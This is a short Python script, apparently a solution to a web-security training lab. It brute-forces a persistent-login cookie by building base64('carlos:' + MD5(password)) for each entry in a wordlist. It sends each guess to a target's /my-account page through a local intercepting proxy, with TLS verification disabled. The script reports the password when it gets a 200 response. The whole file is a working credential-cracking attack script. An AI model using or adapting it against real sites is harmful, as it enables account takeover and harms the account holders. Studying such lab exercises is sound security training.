import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_carlos_account(sess, url):
    
    login_url = url + "/my-account"

    
    with open("passwords.txt") as f:
        while True:
            password = f.readline()
            if not password:
                break
            #https://medium.com/@rajputgajanan50/typeerror-string-argument-without-an-encoding-in-python-957c225978d9#:~:text=print(bytes(%27hello%27%2C%20encoding%3D%27utf%2D8%27))
            md5hash_pass = bytes(("carlos:" + hashlib.md5(str(password.strip()).encode('utf-8')).hexdigest()), encoding='utf-8')
            
            base64_pass = base64.b64encode(md5hash_pass).decode('utf-8')

            cookie = {'stay-logged-in' : base64_pass}
        
            r = sess.get(login_url, cookies=cookie, verify=False, proxies=proxies, allow_redirects=False)
            
            if r.status_code == 200:
                print("(+) Successfully get the carlos password")
                print("(+) The Password is :", password)
                sys.exit(-1)
        
def main():
    
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    
    sess = requests.Session()
    url = sys.argv[1]
    get_carlos_account(sess, url)

if __name__ == "__main__":
    main()